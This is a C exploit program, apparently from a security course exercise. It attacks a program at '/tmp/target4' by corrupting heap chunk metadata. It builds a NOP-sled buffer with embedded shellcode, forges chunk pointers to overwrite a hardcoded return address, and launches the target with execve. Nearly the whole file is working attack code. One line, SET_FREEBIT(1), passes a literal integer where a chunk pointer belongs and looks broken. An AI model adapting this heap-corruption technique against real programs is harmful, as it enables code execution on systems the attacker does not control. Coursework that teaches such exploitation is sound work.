#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

typedef double ALIGN;

typedef union CHUNK_TAG
{
  struct
  {
    union CHUNK_TAG *l;
    union CHUNK_TAG *r;
  }s;
  ALIGN x;
} CHUNK;

#define SET_FREEBIT(chunk) ( *(unsigned *)&(chunk)->s.r |=  0x1 )
#define CLR_FREEBIT(chunk) ( *(unsigned *)&(chunk)->s.r &= ~0x1 )
#define GET_FREEBIT(chunk) ( (unsigned)(chunk)->s.r & 0x1 )

#define RIGHT(chunk) ((CHUNK *)(~0x1 & (unsigned)(chunk)->s.r))

#define CHUNKSIZE(chunk) ((unsigned)RIGHT((chunk)) - (unsigned)(chunk))

#define TOCHUNK(vp) (-1 + (CHUNK *)(vp))
#define FROMCHUNK(chunk) ((void *)(1 + (chunk)))

#define PPOINTER 0x8059878
#define QPOINTER 0x8059948
#define EIP      0xbffffa7c

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[1024];

  memset(buf, 0x90, 1024);
  strncpy(buf+800, shellcode, 45);

  void *vp = (void*)buf + (QPOINTER - PPOINTER);
  CHUNK *p = TOCHUNK(vp);

  p->s.l = (void*)QPOINTER;
  p->s.r = (void*)EIP;

  CHUNK *l = TOCHUNK(vp+sizeof(CHUNK));
  CHUNK *r = TOCHUNK(vp-sizeof(CHUNK));

  strncpy((char*)l+2, "\xeb\x0c", 2);

  SET_FREEBIT(1);
  SET_FREEBIT(p);

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
